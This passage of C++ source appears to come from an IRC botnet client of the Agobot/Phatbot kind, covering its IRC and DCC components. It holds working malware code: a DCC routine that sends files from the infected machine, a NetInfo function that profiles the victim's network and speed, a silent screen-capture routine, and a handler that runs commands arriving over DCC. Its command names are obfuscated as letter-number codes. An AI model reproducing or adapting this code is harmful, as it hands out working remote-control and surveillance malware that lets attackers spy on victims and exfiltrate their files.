		FD_ZERO(&fd_struct); FD_SET(dcc, &fd_struct);
		if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
		{
			sReply.Assign("DCC Timed Out, closing connection.");
			SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); 

			CloseHandle(hFileName); closesocket(dcc); closesocket(sock);
			return false;
		}

		// Wait for connection
		sock = accept(dcc, (SOCKADDR *) &GuestAddr, &addrlen);
		if(sock != INVALID_SOCKET)
		{
			closesocket(dcc);
			while(1) {
				unsigned int Fsend = 1024;

				memset(buffer, 0, sizeof(buffer));
				if(Fsend > iFileSize - iBytesSent) Fsend = iFileSize - iBytesSent;

				SetFilePointer(hFileName, iBytesSent, NULL, FILE_BEGIN);
				ReadFile(hFileName, buffer, Fsend, &dwMode, NULL);

				dwErr1 = send(sock, buffer, Fsend, 0);
				dwErr2 = recv(sock, buffer, sizeof(buffer), 0);

				iBytesSent += dwErr1;
				if(iFileSize - iBytesSent < 1 || dwErr1 < 1 || dwErr2 < 1)
					break;
			}
		}
		sReply.Format("Connection closed(%i/%ikB sent).", iBytesSent / 1024, iFileSize / 1024);
		SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
		CloseHandle(hFileName); closesocket(dcc); closesocket(sock);
	}
#endif // _WIN32
	
	return false; }

CString CIRC::NetInfo()
{	CString sNetInfo; sockaddr sa; socklen_t sas;
	// get ip address
	sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); m_sSocket.GetSockName(sa, sas);

#ifdef WIN32
	// get connection type/name
	unsigned long n; char ctype[8]; char cname[128];
	memset(cname, 0, sizeof(cname)); memset(ctype, 0, sizeof(ctype));
	HINSTANCE wininet_dll=LoadLibrary("WININET.DLL");
    if(wininet_dll)
	{ 	fInternetGetConnectedStateEx=(IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if(!fInternetGetConnectedStateEx)
		{	fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
			if(n&&INTERNET_CONNECTION_MODEM==INTERNET_CONNECTION_MODEM)
				strncpy(ctype, "dial-up", sizeof(ctype)-1);
			else
				strncpy(ctype, "LAN", sizeof(ctype)-1); }
		else
		{	strncpy(ctype, "N/A", sizeof(ctype)-1);
			strncpy(cname, "N/A", sizeof(cname)-1); } }
#else
	// Fixme! add connection type detection for linux
#endif // WIN32

	char szIP[16]; sprintf(szIP, "%d.%d.%d.%d",
		(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);

	sNetInfo.Assign(""); sNetInfo.Append("connection type: ");

#ifdef WIN32
	sNetInfo.Append(ctype); sNetInfo.Append(" ("); sNetInfo.Append(cname); sNetInfo.Append("). ");
#else
	sNetInfo.Append("Linux. ");
#endif // WIN32

		sNetInfo.Append("local IP address: "); sNetInfo.Append(szIP); sNetInfo.Append(". ");
		sNetInfo.Append("connected from: "); sNetInfo.Append(m_sLocalHost); sNetInfo.Append(". ");
		sNetInfo.Append("private ip: ");
	if(IsPrivate(szIP)) sNetInfo.Append("yes. ");
	else sNetInfo.Append("no. ");

	speedtest_data *pData=NULL;

	if(g_pMainCtrl->m_pBot->do_speedtest.bValue) {
		if(!g_pMainCtrl->m_cStartupThread.m_bDataSet)
			pData=&g_pMainCtrl->m_cStartupThread.m_speedData;
	if(pData) {
		CString sTempBuf; sTempBuf.Format("speed: EU(%d kbit/s) US(%d kbit/s) ASIA(%d kbit/s) RYAN(%d kbit/s) Total(%d kbit/s) ",
			pData->lEUSpeed, pData->lUSSpeed, pData->lASIASpeed, pData->lRYAN1918Speed, pData->lTotalSpeed);
		sNetInfo.Append(sTempBuf); }
	
	} else {
	if(g_pMainCtrl->m_bDataSet) pData=&g_pMainCtrl->m_sSpeedData;
	if(pData) {
		CString sTempBuf; sTempBuf.Format("speed: EU(%d kbit/s) US(%d kbit/s) ASIA(%d kbit/s) RYAN(%d kbit/s) Total(%d kbit/s) ",
			pData->lEUSpeed, pData->lUSSpeed, pData->lASIASpeed, pData->lRYAN1918Speed, pData->lTotalSpeed);
		sNetInfo.Append(sTempBuf); }
	}


#ifdef WIN32
	FreeLibrary(wininet_dll);
#endif // WIN32

	return sNetInfo; }

unsigned long volatile g_lLastSend=0;

bool CIRC::SendRaw(const char *szMsg) {
	if(!g_lLastSend) g_lLastSend=GetTickCount();
	if(GetTickCount()-g_lLastSend < 750) { Sleep(750-(GetTickCount()-g_lLastSend)); }
	g_lLastSend=GetTickCount();

	if(!m_sSocket.Write(szMsg, strlen(szMsg)))
	{	m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
		g_pMainCtrl->m_pMac->ClearLogins(); return false; }
	else return true; }

bool CIRC::SendRawFormat(const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendRaw(formatbuf); }

bool CIRC::SendMsg(bool bSilent, bool bNotice, const char *szMsg, const char *szDst)
{	if(bSilent) return false; if (isSilent(szDst)) return false; CString sTheCmd; if(bNotice) sTheCmd.Assign("NOTICE"); else sTheCmd.Assign("PRIVMSG");
	CString sSendBuf; sSendBuf.Format("%s %s :%s\r\n", sTheCmd.CStr(), szDst, szMsg);
	return SendRaw(sSendBuf.Str()); }

void CIRC::Fail()
{	Disconnect(); m_iFailCount++; }

void CIRC::Disconnect()
{	g_pMainCtrl->m_pBot->RunScript(SCRIPT_ONDISCON);
	m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
	g_pMainCtrl->m_pMac->ClearLogins(); }


#ifdef _WIN32
void CIRC::ScreenCap() {
	sockaddr sa; socklen_t sas;
	// get ip address
	sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); m_sSocket.GetSockName(sa, sas);
	
	char szIP[16]; sprintf(szIP, "%d.%d.%d.%d",
		(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);

	HDC MemoryDC, ScreenDC;
	HBITMAP hBitmap;
	HANDLE hFile;
	BITMAPINFO bmi;
	BITMAPINFOHEADER bm;
	BITMAPFILEHEADER hdr;
	LPBYTE lpBits;
	DWORD dwTemp;
	int delay;
	ScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	hBitmap = CreateCompatibleBitmap(ScreenDC, GetDeviceCaps(ScreenDC, HORZRES), GetDeviceCaps(ScreenDC, VERTRES));
	MemoryDC = CreateCompatibleDC(ScreenDC);
	SelectObject(MemoryDC, hBitmap);
	BitBlt(MemoryDC, 0, 0, GetDeviceCaps(ScreenDC, HORZRES), GetDeviceCaps(ScreenDC, VERTRES), ScreenDC, 0, 0, SRCCOPY);
	bm.biSize = sizeof (BITMAPINFOHEADER);
	bm.biWidth = GetDeviceCaps(MemoryDC, HORZRES);
	bm.biHeight = GetDeviceCaps(MemoryDC, VERTRES);
	bm.biPlanes = 1;
	bm.biBitCount = GetDeviceCaps(MemoryDC, BITSPIXEL);
	bm.biCompression = BI_RGB;
	bm.biSizeImage = 0;
	bm.biXPelsPerMeter = 0;
	bm.biYPelsPerMeter = 0;
	bm.biClrUsed = 0;
	bm.biClrImportant = 0;
	bmi.bmiHeader = bm;
//	bmi.bmiColors[0] = NULL;
	CString bmpname;
	bmpname.Format("%s.bmp", szIP);
	lpBits = (LPBYTE) GlobalAlloc(GMEM_FIXED, bm.biWidth * bm.biHeight * (bm.biBitCount / 8));
	GetDIBits(MemoryDC, hBitmap, 0, (WORD) bm.biHeight, lpBits, &bmi, DIB_RGB_COLORS);
	hFile = CreateFile(bmpname, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	hdr.bfType = 0x4d42;
	hdr.bfSize = (DWORD) sizeof (BITMAPFILEHEADER) + sizeof (BITMAPINFOHEADER) + bm.biWidth * bm.biHeight * (bm.biBitCount / 8);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = (DWORD) sizeof (BITMAPFILEHEADER) + sizeof (BITMAPINFOHEADER);
	WriteFile(hFile, (LPVOID) &hdr, sizeof (BITMAPFILEHEADER), (LPDWORD) &dwTemp, NULL);
	WriteFile(hFile, (LPVOID) &bm, sizeof (BITMAPINFOHEADER), (LPDWORD) &dwTemp, NULL);
	WriteFile(hFile, (LPVOID) lpBits, bm.biWidth * bm.biHeight * (bm.biBitCount / 8), (LPDWORD) &dwTemp, NULL);
	CloseHandle(hFile);
	// Free memory.
	GlobalFree((HGLOBAL)lpBits);
	ReleaseDC(0, MemoryDC);
	ReleaseDC(0, ScreenDC);  }

#endif // _WIN32

CDCC_Handler::CDCC_Handler() {
	m_pClientSocket=NULL; m_sInitiator.Assign("");
	m_lFlags=DELIVERY_FLAGS_RELIABLE|DELIVERY_FLAGS_LOWLAT;
	m_sMedium.Assign("DCC"); }
CDCC_Handler::~CDCC_Handler() { delete m_pClientSocket; }

void *CDCC_Handler::Run() {
	CString sRecvBuf, sToken; while(m_bRunning) {
		if(m_pClientSocket->RecvLineIRC(sRecvBuf.GetBuffer(8192), 8192)) {
			sToken=sRecvBuf.Token(0, "\r"); int iTokenIndex=0;
			while(sToken.Compare("")) {
				CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
				// Check silent and notice parameters, and set bool flags accordingly
				if(sToken.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
				if(sToken.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
				if(sToken.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;
				
				// Parse the strings, and insert them into the message
				msg->sSrc.Assign(m_sInitiator);
				msg->sIdentd.Assign("");
				msg->sHost.Assign("");
				msg->sDest.Assign(g_pMainCtrl->m_sUserName);
				msg->pReply=(CReply_Iface*)this;
				msg->sChatString.Assign(sToken);
#ifdef DBGCONSOLE
				g_cConsDbg.Log(1, "CDCC_Handler(0x%8.8Xh): %s / %s / \"%s\"...\n", \
					this, msg->sSrc.CStr(), msg->sDest.CStr(), msg->sChatString.CStr());
#endif
				// Let the bot handle it
				ex->Set(msg); delete msg;

				// Fail if the hash check failed
				if(!g_pMainCtrl->m_bHashCheckFailed) ex->Start(true);
				else DoReply(msg, "Go home newb!");

				iTokenIndex++; sToken=sRecvBuf.Token(iTokenIndex, "\r"); }
		} else break;
	}
	return NULL; }

bool CDCC_Handler::SendRaw(const char *szMsg) {
	if(!m_pClientSocket->Write(szMsg, strlen(szMsg)))
	{	m_bRunning=false; return false; }
	else return true; }

bool CDCC_Handler::SendRawFormat(const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendRaw(formatbuf); }

bool CDCC_Handler::SendMsg(bool bSilent, bool bNotice, const char *szMsg, const char *szDst)
{	if(bSilent) return false;
	CString sSendBuf; sSendBuf.Format("%s\r\n", szMsg);
	return SendRaw(sSendBuf.Str()); }

REGOBJ(CIRC, g_pIRC, false, 0);
REGCMD(m_cmdDisconnect,	dp(4,9,19,3,15,14,14,5,3,20,0),	false,	g_pIRC);
REGCMD(m_cmdAction,		dp(1,3,20,9,15,14,0),			false,	g_pIRC);
REGCMD(m_cmdDCCSend,	dp(4,3,3,19,5,14,4,0),			false,  g_pIRC);
REGCMD(m_cmdGetEdu,		dp(7,5,20,5,4,21,0),			false,	g_pIRC);
REGCMD(m_cmdGetHost,	dp(7,5,20,8,15,19,20,0),		false,	g_pIRC);
REGCMD(m_cmdJoin,		dp(10,15,9,14,0),				false,	g_pIRC);
REGCMD(m_cmdMode,		dp(13,15,4,5,0),				false,	g_pIRC);
REGCMD(m_cmdNetInfo,	dp(14,5,20,9,14,6,15,0),		false,	g_pIRC);
REGCMD(m_cmdPart,		dp(16,1,18,20,0),				false,	g_pIRC);
REGCMD(m_cmdPrivMsg,	dp(13,19,7,0),					false,	g_pIRC);
REGCMD(m_cmdQuit,		dp(17,21,9,20,0),				false,	g_pIRC);
REGCMD(m_cmdRaw,		dp(18,1,23,0),					false,	g_pIRC);
REGCMD(m_cmdReconnect,	dp(18,5,3,15,14,14,5,3,20,0),	false,	g_pIRC);
REGCMD(m_cmdServer,		dp(19,5,18,22,5,18,0),			false,	g_pIRC);
#ifdef _WIN32
REGCMD(m_cmdScreenCap,	dp(19,3,18,5,5,14,0),			false,	g_pIRC);
#endif
